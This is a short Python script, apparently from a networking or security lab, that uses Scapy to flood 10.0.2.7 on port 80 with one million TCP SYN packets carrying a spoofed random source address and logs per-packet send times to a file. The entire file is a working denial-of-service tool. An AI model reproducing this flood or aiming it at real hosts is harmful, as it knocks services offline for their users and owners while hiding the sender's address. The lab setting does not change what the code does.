import time
from scapy.all import *
from scapy.layers.inet import TCP, IP
from random import randint


def tcp_syn(ip_address, dport):
    sport = randint(1000, 55000)
    s_addr = RandIP()
    d_addr = ip_address
    sqe_num = randint(1000000, 5999999)
    pack = IP(src=s_addr, dst=d_addr)/TCP(sport=sport, dport=int(dport), seq=sqe_num, flags="S")
    timimg = []
    f = open("syns_results_p.txt", "w")
    time_start = time.time()
    counter = 0
    for i in range(100):
        for j in range(10_000):
            if j % 500 == 0:
                print(f"{counter * 500} packets already sent")
                counter += 1
            t0 = time.time()
            # print((i*100)+(j+1))
            send(pack, verbose=False)
            tim = time.time() - t0
            timimg.append(tim)
            f.write(f"{(i*100)+(j+1)}, {tim}\n")
    time_end = time.time()
    avg = sum(timimg)/len(timimg)
    f.write(f"Total {time_end - time_start}\n")
    f.write(f"Average {avg}\n")


if __name__ == '__main__':
    sport = randint(1024, 65535)
    tcp_syn("10.0.2.7", "80")
